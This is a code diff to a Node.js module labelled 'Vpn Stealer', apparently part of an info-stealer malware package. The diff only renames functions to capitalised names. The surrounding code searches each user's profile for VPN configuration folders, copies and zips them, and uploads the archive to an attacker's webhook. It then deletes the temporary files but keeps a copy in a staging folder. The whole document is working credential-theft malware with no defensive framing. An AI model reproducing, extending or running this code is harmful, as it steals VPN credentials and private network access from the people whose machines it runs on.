@@ -9,17 +9,17 @@ const fileutil = require('./../../utils/fileutil/fileutil.js');
 const hardware = require('./../../utils/hardware/hardware.js');
 
 module.exports = async (webhookUrl) => {
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     const vpnsTempDir = path.join(os.tmpdir(), 'vpns-temp');
     if (!fs.existsSync(vpnsTempDir)) {
         fs.mkdirSync(vpnsTempDir, { recursive: true });
-    };
+    }
 
     let vpnsFound = '';
 
     for (const user of users) {
-        for (const [name, relativePath] of Object.entries(vpnsPaths.getVpns())) {
+        for (const [name, relativePath] of Object.entries(vpnsPaths.GetVpns())) {
             const vpnsPath = path.join(user, relativePath);
 
             if (!fs.existsSync(vpnsPath) || !fs.lstatSync(vpnsPath).isDirectory()) {
@@ -28,7 +28,7 @@ module.exports = async (webhookUrl) => {
 
             try {
                 const vpnsDestPath = path.join(vpnsTempDir, user.split(path.sep)[2], name);
-                await fileutil.copy(vpnsPath, vpnsDestPath);
+                await fileutil.Copy(vpnsPath, vpnsDestPath);
                 vpnsFound += `\n✅ ${user.split(path.sep)[2]} - ${name}`;
             } catch (err) {
                 continue;
@@ -46,12 +46,12 @@ module.exports = async (webhookUrl) => {
 
     const vpnsTempZip = path.join(os.tmpdir(), 'vpns.zip');
     try {
-        await fileutil.zipDirectory({
+        await fileutil.ZipDirectory({
             inputDir: vpnsTempDir,
             outputZip: vpnsTempZip
         });
 
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [{
                 title: 'Vpn Stealer',
                 description: '```' + vpnsFound + '```',
@@ -59,10 +59,10 @@ module.exports = async (webhookUrl) => {
         }, [vpnsTempZip]);
 
         const WishTempDir = fileutil.WishTempDir('vpns');
-        await fileutil.copy(vpnsTempDir, WishTempDir);
+        await fileutil.Copy(vpnsTempDir, WishTempDir);
         
         [vpnsTempDir, vpnsTempZip].forEach(async dir => {
-            await fileutil.removeDir(dir);
+            await fileutil.RemoveDir(dir);
         });
     } catch (error) {
         console.error(error);
